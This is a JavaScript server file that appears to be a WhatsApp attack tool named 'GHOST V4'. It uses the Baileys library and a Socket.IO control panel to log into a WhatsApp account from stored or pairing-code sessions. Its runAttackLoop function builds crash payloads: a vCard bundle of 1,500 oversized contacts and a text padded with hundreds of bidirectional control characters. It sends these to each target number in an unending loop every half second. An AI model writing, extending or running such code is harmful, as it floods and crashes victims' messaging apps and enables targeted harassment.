// stateless_server.js
// VERSION: GHOST-V4-STABILITY-FIX
// TIMESTAMP: ${new Date().toISOString()}

import { Server } from "npm:socket.io";
import { createServer } from "node:http";
import { 
    default as makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    delay, 
    makeCacheableSignalKeyStore,
    initAuthCreds,
    proto,
    BufferJSON
} from 'npm:@whiskeysockets/baileys';
import { Boom } from 'npm:@hapi/boom';
import pino from 'npm:pino';

const httpServer = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('MALXGMN GHOST SERVER V4 (STABLE) IS RUNNING');
});

const io = new Server(httpServer, {
    cors: {
        origin: "*", 
        methods: ["GET", "POST"]
    }
});

// GLOBAL VARS
let activeSock = null;
let isAttacking = false;
let socketInitializing = false;

// AUTH HELPER (Memory Only)
const useSocketAuthState = async (socket, initialData) => {
    const creds = initialData?.creds 
        ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
        : await initAuthCreds();

    const keys = initialData?.keys || {};

    const saveState = async () => {
        const exportData = { creds, keys };
        socket.emit('session_save', JSON.stringify(exportData, BufferJSON.replacer));
    };

    return {
        state: {
            creds,
            keys: {
                get: (type, ids) => {
                    const data = {};
                    ids.forEach(id => {
                        let value = keys[`${type}-${id}`];
                        if (type === 'app-state-sync-key' && value) {
                            value = proto.Message.AppStateSyncKeyData.fromObject(value);
                        }
                        data[id] = value;
                    });
                    return data;
                },
                set: (data) => {
                    for (const category in data) {
                        for (const id in data[category]) {
                            const value = data[category][id];
                            const key = `${category}-${id}`;
                            if (value) {
                                keys[key] = value;
                            } else {
                                delete keys[key];
                            }
                        }
                    }
                    saveState(); 
                }
            }
        },
        saveCreds: async () => await saveState()
    };
};

io.on("connection", (socket) => {
    console.log(`[+] Client Connected: ${socket.id}`);

    // RESET COMMAND
    socket.on("force_reset", async () => {
        if (activeSock) {
            try { activeSock.end(undefined); } catch {}
            activeSock = null;
        }
        socketInitializing = false;
        socket.emit("status", "Server Reset. Re-initializing...");
        // Client should emit init_session again
    });

    socket.on("init_session", async (rawSessionJson) => {
        // Prevent double init
        if (socketInitializing) return;
        socketInitializing = true;

        try {
            if (activeSock) {
                try { activeSock.end(undefined); } catch {}
                activeSock = null;
            }

            let initialData = null;
            if (rawSessionJson) {
                try {
                    initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
                    console.log("[✔] Session loaded from client");
                } catch (e) {
                    console.log("[-] Invalid JSON session");
                }
            } 
            await startSock(socket, initialData);

        } catch (e) {
            console.error("Init Error:", e);
            socket.emit("error", "Init Failed: " + e.message);
            socketInitializing = false;
        }
    });

    socket.on("use_pairing_code", async (phoneNumber) => {
        if (!activeSock) {
            return socket.emit("error", "WA Engine not ready. Wait 5 seconds.");
        }
        try {
            console.log(`[*] Requesting pairing code for ${phoneNumber}`);
            
            // Wait a bit to ensure socket is stable
            await delay(2000); 

            const code = await activeSock.requestPairingCode(phoneNumber);
            console.log(`[+] Code Generated: ${code}`);
            socket.emit("pairing_code", code);
        } catch (e) {
            console.error("Pairing Error:", e);
            socket.emit("error", "Pairing Failed. Restart App. " + e.message);
        }
    });

    socket.on("attack_start", async (targets) => {
        if (!activeSock) return socket.emit("error", "WA Not Connected");
        runAttackLoop(socket, targets);
    });

    socket.on("attack_stop", () => {
        isAttacking = false;
        socket.emit("status", "Attack Stopped");
    });
});

async function startSock(socket, initialData) {
    const { state, saveCreds } = await useSocketAuthState(socket, initialData);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        // Ubuntu/Chrome is stable for Pairing Code
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        generateHighQualityLinkPreview: true,
        // Increase timeout for Deno environment
        connectTimeoutMs: 60000, 
    });

    activeSock = sock;
    socketInitializing = false;

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            console.log("[QR] QR Generated");
            socket.emit('qr', qr);
        }

        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)
                ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                : true;
            
            console.log(`[!] Closed. Reconnect: ${shouldReconnect}`);

            if (shouldReconnect) {
                // Delay reconnection slightly to avoid spam loop
                setTimeout(() => startSock(socket, initialData), 3000);
            } else {
                socket.emit('logged_out', 'Session Invalidated');
                activeSock = null;
            }
        } else if (connection === 'open') {
            console.log("[+] Connected");
            socket.emit('ready', 'WhatsApp Connected');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

async function runAttackLoop(socket, rawTargets) {
    isAttacking = true;
    const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    
    // PAYLOADS (Unicode Safe)
    const _f = "\\uD83D\\uDD25"; 
    const _s = "\\u2620\\uFE0F"; 
    const _b = "\\uD83D\\uDCA3"; 
    const _i = "\\u200e\\u200f"; 

    let heavyVcardContent = '';
    const vcardHeader = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
    const vcardFooter = '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
    
    for(let i=0; i<1500; i++) {
        heavyVcardContent += vcardHeader + _f.repeat(10) + 'OVERLOAD_' + i + vcardFooter;
    }
    
    const vcardPayload = { contacts: { displayName: _s, contacts: [{ vcard: heavyVcardContent }] } };
    const crashText = _b + _i.repeat(500);

    let counter = 0;
    while(isAttacking) {
        try {
            if (!activeSock) { await delay(2000); continue; }
            counter++;
            
            const batchTasks = [];
            for (const jid of targetJids) {
                batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
                batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
            }
            await Promise.all(batchTasks);
            
            socket.emit('attack_progress', { count: counter });
            await delay(500); 
        } catch (e) {
            await delay(1000);
        }
    }
}

const PORT = 8000;
httpServer.listen(PORT, () => {
    console.log(`[SERVER] GHOST Listening on port ${PORT}`);
});
